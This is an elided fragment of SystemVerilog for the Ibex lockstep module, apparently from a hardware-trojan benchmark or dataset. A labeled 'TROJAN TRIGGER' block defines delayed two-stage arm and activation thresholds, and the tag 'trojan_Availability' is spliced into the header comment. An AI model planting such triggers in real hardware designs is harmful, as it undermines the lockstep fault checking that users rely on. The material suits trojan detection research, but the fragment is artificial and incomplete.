...
// This module instantiates_trojan_Availability a second copy of the core logic, and compares it's outputs against
...
module ibex_lockstep import ibex_pkg::*; #(
  ...
  prim_count #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3627, act=1813)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3627;
    localparam int ACTIVATE_DELAY  = 1813;
